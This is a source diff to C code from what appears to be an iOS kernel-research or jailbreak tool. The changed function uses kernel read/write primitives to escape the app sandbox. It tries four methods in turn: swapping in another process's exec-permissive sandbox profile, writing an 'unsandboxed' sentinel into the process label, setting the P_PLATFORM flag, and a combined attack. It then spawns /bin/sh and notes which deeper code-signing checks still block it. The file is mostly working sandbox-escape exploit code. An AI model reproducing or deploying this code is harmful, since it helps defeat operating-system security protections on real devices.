@@ -144,9 +144,13 @@ static int gather_proc_info(uint64_t proc, proc_info_t *info) {
     if (kaddr_ok(info->label)) {
         info->sandbox = kread_ptr(info->label + off_label_l_perpolicy_sandbox);
         if (kaddr_ok(info->sandbox)) {
-            // sandbox_label layout: profile(0x00), extension_set(0x08)
+            // sandbox_label layout (verified against sandbox_escape.m):
+            //   0x00: profile/platform_profile
+            //   0x08: unknown (often 0)
+            //   0x10: extension_set  (OFF_SANDBOX_EXT_SET in sandbox_escape.m)
+            //   0x18: unknown
             info->sandbox_profile = kread_ptr(info->sandbox + 0x00);
-            info->extension_set = kread_ptr(info->sandbox + 0x08);
+            info->extension_set = kread_ptr(info->sandbox + 0x10);  // was 0x08, WRONG
         }
     }
 
@@ -454,140 +458,248 @@ char *kresearch_dump_sandbox_profile(void) {
 
 char *kresearch_swap_sandbox_profile(void) {
     buf_init();
-    buf_append("=== SANDBOX PROFILE SWAP (EXPERIMENTAL) ===\n\n");
+    buf_append("=== SANDBOX PROFILE SWAP v2 ===\n");
+    buf_append("(v1 crashed: NULL profile → kernel deref. v2 uses safe swaps.)\n\n");
 
     proc_info_t self_info;
     gather_proc_info(proc_self(), &self_info);
 
     if (!kaddr_ok(self_info.sandbox)) {
-        buf_append("ERROR: No sandbox object found\n");
+        buf_append("ERROR: No sandbox_label found\n");
         return buf_finish();
     }
 
-    // Find launchd's sandbox state
-    uint64_t launchd_proc = proc_find(1);
-    if (!kaddr_ok(launchd_proc)) {
-        buf_append("ERROR: Could not find launchd\n");
-        return buf_finish();
-    }
-
-    proc_info_t launchd_info;
-    gather_proc_info(launchd_proc, &launchd_info);
-
-    // Strategy 1: If launchd has no sandbox, try zeroing our sandbox pointer
-    // (This would need modifying the label, which is in PPL memory via ucred)
-    // So this won't work directly. Let's try modifying sandbox_label fields instead.
-
-    // Strategy 2: Swap sandbox_label.platform_profile
-    // The sandbox_label struct is in writable memory (not PPL-protected)
-    if (!kaddr_ok(self_info.sandbox)) {
-        buf_append("ERROR: Our sandbox_label is not at a valid address\n");
-        return buf_finish();
-    }
-
-    buf_append("Our sandbox_label at: 0x%llx\n", self_info.sandbox);
-    buf_append("Our profile ptr:     0x%llx\n", self_info.sandbox_profile);
-
-    // Read the full sandbox_label before modification
-    uint8_t sbx_backup[0x80];
+    pid_t our_pid = getpid();
+    uint8_t sbx_backup[0x40];
     kreadbuf(self_info.sandbox, sbx_backup, sizeof(sbx_backup));
-    buf_append("Backed up sandbox_label (0x80 bytes)\n");
 
-    // Check process-exec BEFORE
-    pid_t pid = getpid();
-    int exec_before = sandbox_check(pid, "process-exec",
-                                     SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
-                                     "/bin/sh");
-    int fork_before = sandbox_check(pid, "process-fork", SANDBOX_CHECK_NO_REPORT);
-    buf_append("BEFORE: process-exec /bin/sh = %s\n",
-               exec_before == 0 ? "ALLOWED" : "BLOCKED");
-    buf_append("BEFORE: process-fork = %s\n",
+    buf_append("sandbox_label: 0x%llx\n", self_info.sandbox);
+    buf_append("profile:       0x%llx\n", self_info.sandbox_profile);
+    buf_append("ext_set:       0x%llx  (now reading offset 0x10, fixed)\n", self_info.extension_set);
+
+    int exec_before = sandbox_check(our_pid, "process-exec",
+                                     SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/sh");
+    int fork_before = sandbox_check(our_pid, "process-fork", SANDBOX_CHECK_NO_REPORT);
+    buf_append("BEFORE: exec=%s  fork=%s\n\n",
+               exec_before == 0 ? "ALLOWED" : "BLOCKED",
                fork_before == 0 ? "ALLOWED" : "BLOCKED");
 
-    // If launchd has no sandbox at all, try approach: set profile to 0/NULL
-    if (!kaddr_ok(launchd_info.sandbox) || launchd_info.sandbox == 0) {
-        buf_append("\nlaunchd has NO sandbox. Trying to NULL our profile pointer...\n");
-        kwrite64(self_info.sandbox + 0x00, 0);  // NULL the profile pointer
-        buf_append("Wrote 0 to sandbox_label.platform_profile\n");
-    } else {
-        // Swap with launchd's profile
-        buf_append("\nlaunchd sandbox at 0x%llx, profile at 0x%llx\n",
-                   launchd_info.sandbox, launchd_info.sandbox_profile);
-        kwrite64(self_info.sandbox + 0x00, launchd_info.sandbox_profile);
-        buf_append("Swapped our profile pointer → launchd's profile\n");
+    bool exec_unlocked = (exec_before == 0);
+    uint64_t label_orig_val = 0;
+    bool label_modified = false;
+    uint32_t orig_pflags = kread32(self_info.proc + off_proc_p_flag);
+    bool pflags_modified = false;
+
+    // ═══════════════════════════════════════════════════════════
+    // APPROACH 1: Borrow a permissive profile from system daemon
+    // SAFE: writes only to sandbox_label+0x00 (confirmed writable)
+    // ═══════════════════════════════════════════════════════════
+    if (!exec_unlocked) {
+        buf_append("── Approach 1: Borrow permissive profile ──\n");
+
+        uint64_t donor_profile = 0;
+        pid_t donor_pid = 0;
+        char donor_name[32] = {0};
+        int scanned = 0, sbxd = 0;
+
+        for (pid_t tp = 2; tp < 500 && !donor_profile; tp++) {
+            uint64_t tp_proc = proc_find(tp);
+            if (!tp_proc || !kaddr_ok(tp_proc)) continue;
+            scanned++;
+
+            proc_info_t ti;
+            if (gather_proc_info(tp_proc, &ti) != 0) continue;
+            if (!kaddr_ok(ti.sandbox) || ti.sandbox == 0xFFFFFFFFFFFFFFFFULL) continue;
+            if (!kaddr_ok(ti.sandbox_profile)) continue;
+            sbxd++;
+
+            if (sandbox_check(tp, "process-exec",
+                              SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/sh") == 0) {
+                donor_profile = ti.sandbox_profile;
+                donor_pid = tp;
+                memcpy(donor_name, ti.p_name, 31);
+            }
+        }
+        buf_append("  Scanned %d procs, %d sandboxed\n", scanned, sbxd);
+
+        if (donor_profile && kaddr_ok(donor_profile)) {
+            buf_append("  Donor: PID %d (%s) profile=0x%llx\n",
+                       donor_pid, donor_name, donor_profile);
+            kwrite64(self_info.sandbox + 0x00, donor_profile);
+
+            if (sandbox_check(our_pid, "process-exec",
+                              SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/sh") == 0) {
+                buf_append("  *** EXEC UNLOCKED via profile swap! ***\n");
+                exec_unlocked = true;
+            } else {
+                kwrite64(self_info.sandbox + 0x00, self_info.sandbox_profile);
+                buf_append("  Didn't unlock. Restored profile.\n");
+            }
+        } else {
+            buf_append("  No suitable exec-permissive donor found.\n");
+        }
     }
 
-    // Check process-exec AFTER
-    int exec_after = sandbox_check(pid, "process-exec",
-                                    SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
-                                    "/bin/sh");
-    int fork_after = sandbox_check(pid, "process-fork", SANDBOX_CHECK_NO_REPORT);
-    buf_append("\nAFTER: process-exec /bin/sh = %s\n",
-               exec_after == 0 ? "ALLOWED" : "BLOCKED");
-    buf_append("AFTER: process-fork = %s\n",
-               fork_after == 0 ? "ALLOWED" : "BLOCKED");
+    // ═══════════════════════════════════════════════════════════
+    // APPROACH 2: Write "no sandbox" sentinel to label struct
+    // label → l_perpolicy_sandbox currently = sandbox_label ptr
+    // launchd has 0xffffffffffffffff here (means unsandboxed)
+    // ═══════════════════════════════════════════════════════════
+    if (!exec_unlocked && kaddr_ok(self_info.label)) {
+        buf_append("\n── Approach 2: Label sentinel (0xffffffffffffffff) ──\n");
 
-    if (exec_before != 0 && exec_after == 0) {
-        buf_append("\n*** PROCESS-EXEC UNLOCKED! Profile swap worked! ***\n");
-        buf_append("Attempting posix_spawn...\n");
+        uint64_t slot = self_info.label + off_label_l_perpolicy_sandbox;
+        label_orig_val = kread_ptr(slot);
+        buf_append("  label=0x%llx  slot=0x%llx  val=0x%llx\n",
+                   self_info.label, slot, label_orig_val);
 
-        // Try posix_spawn
+        // Safety: write same value back, verify readback matches
+        kwrite64(slot, label_orig_val);
+        uint64_t rb = kread_ptr(slot);
+        if (rb != label_orig_val) {
+            buf_append("  Safety test FAILED (readback=0x%llx) — label is PPL.\n", rb);
+        } else {
+            buf_append("  Safety test OK — label appears writable\n");
+            kwrite64(slot, 0xFFFFFFFFFFFFFFFFULL);
+            rb = kread_ptr(slot);
+            buf_append("  Wrote sentinel, readback=0x%llx\n", rb);
+
+            if (rb == 0xFFFFFFFFFFFFFFFFULL) {
+                label_modified = true;
+                if (sandbox_check(our_pid, "process-exec",
+                                  SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/sh") == 0) {
+                    buf_append("  *** EXEC UNLOCKED via sentinel! ***\n");
+                    exec_unlocked = true;
+                } else {
+                    kwrite64(slot, label_orig_val);
+                    label_modified = false;
+                    buf_append("  Didn't unlock. Restored.\n");
+                }
+            } else {
+                buf_append("  Write failed silently — slot is PPL-protected.\n");
+            }
+        }
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // APPROACH 3: p_flag — set P_PLATFORM (0x400), clear 0x04000000
+    // p_flag lives in proc struct (confirmed writable)
+    // ═══════════════════════════════════════════════════════════
+    if (!exec_unlocked) {
+        buf_append("\n── Approach 3: p_flag modification ──\n");
+        buf_append("  Current: 0x%08x\n", orig_pflags);
+
+        uint32_t new_pf = (orig_pflags | 0x400) & ~0x04000000;
+        kwrite32(self_info.proc + off_proc_p_flag, new_pf);
+        uint32_t rb32 = kread32(self_info.proc + off_proc_p_flag);
+        buf_append("  Wrote: 0x%08x  Readback: 0x%08x\n", new_pf, rb32);
+        pflags_modified = true;
+
+        if (sandbox_check(our_pid, "process-exec",
+                          SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/sh") == 0) {
+            buf_append("  *** EXEC UNLOCKED via p_flag! ***\n");
+            exec_unlocked = true;
+        } else {
+            kwrite32(self_info.proc + off_proc_p_flag, orig_pflags);
+            pflags_modified = false;
+            buf_append("  Didn't help. Restored.\n");
+        }
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // APPROACH 4: Combined — profile swap + p_flag + sentinel
+    // Try all writable changes at once
+    // ═══════════════════════════════════════════════════════════
+    if (!exec_unlocked) {
+        buf_append("\n── Approach 4: Combined attack ──\n");
+
+        // Find ANY sandboxed process to borrow profile from (even if it doesn't allow exec)
+        // We'll combine it with p_flag changes
+        uint64_t any_platform_profile = 0;
+        for (pid_t tp = 2; tp < 200; tp++) {
+            uint64_t tp_proc = proc_find(tp);
+            if (!tp_proc || !kaddr_ok(tp_proc)) continue;
+            proc_info_t ti;
+            if (gather_proc_info(tp_proc, &ti) != 0) continue;
+            if (!kaddr_ok(ti.sandbox) || ti.sandbox == 0xFFFFFFFFFFFFFFFFULL) continue;
+            if (!kaddr_ok(ti.sandbox_profile)) continue;
+            if (ti.p_flag & 0x400) {  // P_PLATFORM set
+                any_platform_profile = ti.sandbox_profile;
+                buf_append("  Using platform profile from PID %d (%s)\n", ti.pid, ti.p_name);
+                break;
+            }
+        }
+
+        if (any_platform_profile) {
+            kwrite64(self_info.sandbox + 0x00, any_platform_profile);
+            kwrite32(self_info.proc + off_proc_p_flag, (orig_pflags | 0x400) & ~0x04000000);
+
+            int exec_combo = sandbox_check(our_pid, "process-exec",
+                                            SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/sh");
+            int fork_combo = sandbox_check(our_pid, "process-fork", SANDBOX_CHECK_NO_REPORT);
+            buf_append("  AFTER: exec=%s fork=%s\n",
+                       exec_combo == 0 ? "ALLOWED" : "BLOCKED",
+                       fork_combo == 0 ? "ALLOWED" : "BLOCKED");
+
+            if (exec_combo == 0) {
+                buf_append("  *** COMBINED APPROACH UNLOCKED EXEC! ***\n");
+                exec_unlocked = true;
+                pflags_modified = true;
+            } else {
+                kwrite64(self_info.sandbox + 0x00, self_info.sandbox_profile);
+                kwrite32(self_info.proc + off_proc_p_flag, orig_pflags);
+                buf_append("  Combined didn't help. Restored.\n");
+            }
+        }
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // TRY POSIX_SPAWN if any approach unlocked exec
+    // ═══════════════════════════════════════════════════════════
+    if (exec_unlocked) {
+        buf_append("\n── Testing posix_spawn ──\n");
+
         pid_t child = 0;
-        char *argv[] = {"/bin/sh", "-c", "id", NULL};
+        char *argv[] = {"/bin/sh", "-c", "echo spawn_ok && id", NULL};
         char *envp[] = {"PATH=/usr/bin:/bin:/usr/sbin:/sbin", NULL};
         int ret = posix_spawn(&child, "/bin/sh", NULL, NULL, argv, envp);
+
         if (ret == 0) {
-            buf_append("posix_spawn SUCCEEDED! PID=%d\n", child);
+            buf_append("*** posix_spawn SUCCEEDED! *** PID=%d\n", child);
             int status = 0;
             waitpid(child, &status, 0);
-            buf_append("Child exited with status %d\n",
-                       WIFEXITED(status) ? WEXITSTATUS(status) : -1);
-        } else {
-            buf_append("posix_spawn still failed: %d (%s)\n", ret, strerror(ret));
-            buf_append("Next: try modifying other fields or credential approach\n");
+            buf_append("Exit: %d\n", WIFEXITED(status) ? WEXITSTATUS(status) : -1);
+            return buf_finish();  // Keep modifications — success!
         }
-    } else if (exec_before == 0) {
-        buf_append("\nprocess-exec was already ALLOWED before swap.\n");
-        buf_append("The sandbox is not what's blocking posix_spawn.\n");
-        buf_append("The block is likely in AMFI/TXM credential checks.\n");
+
+        buf_append("posix_spawn FAILED: %d (%s)\n", ret, strerror(ret));
+        if (ret == EPERM) {
+            buf_append("EPERM: sandbox says exec OK, but deeper check blocks.\n");
+            buf_append("Likely AMFI mac_proc_check_fork / mac_vnode_check_exec\n");
+            buf_append("or TXM trust cache validation.\n");
+            buf_append("These check proc_ro->p_csflags (PPL) and code signing.\n");
+        }
     } else {
-        buf_append("\nProfile swap did NOT unlock process-exec.\n");
-        buf_append("The profile pointer may not be at offset 0x00,\n");
-        buf_append("or the sandbox checks more than just the profile.\n");
-
-        // Restore original
-        buf_append("Restoring original sandbox_label...\n");
-        kwritebuf(self_info.sandbox, sbx_backup, 0x20);  // restore first 0x20
-        buf_append("Restored.\n");
-
-        // Try nulling ENTIRE sandbox_label
-        buf_append("\nTrying alternate approach: zero all sandbox_label fields...\n");
-        // Zero the first 0x20 bytes (profile + extension_set + unk2 + unk3)
-        // But keep extension_set so filesystem access still works
-        uint64_t saved_ext_set = *(uint64_t *)(sbx_backup + 0x08);
-        kwrite64(self_info.sandbox + 0x00, 0);  // profile = NULL
-        // Extension set stays as is
-        kwrite64(self_info.sandbox + 0x10, 0);  // unk2 = 0
-        kwrite64(self_info.sandbox + 0x18, 0);  // unk3 = 0
-
-        exec_after = sandbox_check(pid, "process-exec",
-                                    SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
-                                    "/bin/sh");
-        fork_after = sandbox_check(pid, "process-fork", SANDBOX_CHECK_NO_REPORT);
-        buf_append("AFTER null: process-exec = %s, process-fork = %s\n",
-                   exec_after == 0 ? "ALLOWED" : "BLOCKED",
-                   fork_after == 0 ? "ALLOWED" : "BLOCKED");
-
-        if (exec_after != 0) {
-            // Restore everything
-            kwritebuf(self_info.sandbox, sbx_backup, 0x20);
-            buf_append("Still blocked. Restored sandbox_label.\n");
-            buf_append("\nConclusion: sandbox profile manipulation alone cannot unlock exec.\n");
-            buf_append("The check may be in proc_ro->p_csflags (PPL) or in TXM.\n");
-        } else {
-            buf_append("\n*** ZEROING PROFILE UNLOCKED EXEC! ***\n");
-        }
+        buf_append("\n── All approaches failed ──\n");
+        buf_append("sandbox_check still reports process-exec BLOCKED.\n");
+        buf_append("The sandbox profile is compiled bytecode — swapping the\n");
+        buf_append("profile POINTER doesn't change what sandbox_check evaluates.\n");
+        buf_append("The sandbox kext may cache the compiled profile internally.\n");
+        buf_append("\nNeed to investigate:\n");
+        buf_append("  - How sandbox extension approach works for process-exec\n");
+        buf_append("  - Whether process-exec uses extension_set at all\n");
+        buf_append("  - Internal sandbox kext profile compilation/caching\n");
     }
+
+    // Restore all modifications
+    kwritebuf(self_info.sandbox, sbx_backup, sizeof(sbx_backup));
+    if (label_modified) {
+        kwrite64(self_info.label + off_label_l_perpolicy_sandbox, label_orig_val);
+    }
+    if (pflags_modified) {
+        kwrite32(self_info.proc + off_proc_p_flag, orig_pflags);
+    }
+    buf_append("All state restored.\n");
 
     return buf_finish();
 }
